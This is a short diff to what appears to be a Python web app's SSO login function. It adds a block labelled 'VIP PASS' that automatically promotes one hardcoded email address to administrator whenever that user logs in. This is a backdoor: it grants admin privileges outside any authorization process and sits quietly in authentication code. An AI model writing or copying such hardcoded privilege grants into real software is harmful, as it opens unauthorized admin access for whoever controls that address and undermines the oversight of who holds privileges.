@@ -113,6 +113,13 @@ def process_sso_login(db: Session, response: Response, email: str, username: str
         db.commit()
         db.refresh(user)
 
+    # --- VIP PASS: Auto-promote specific user to Admin ---
+    if email == "kan.gnyanesh@gmail.com" and not user.is_admin:
+        user.is_admin = True
+        db.commit()
+        db.refresh(user)
+    # -----------------------------------------------------
+
     jwt_token = create_access_token(data={"sub": str(user.id), "role": user.role})
     
     # Send user to the Frontend "Sorting Hat"
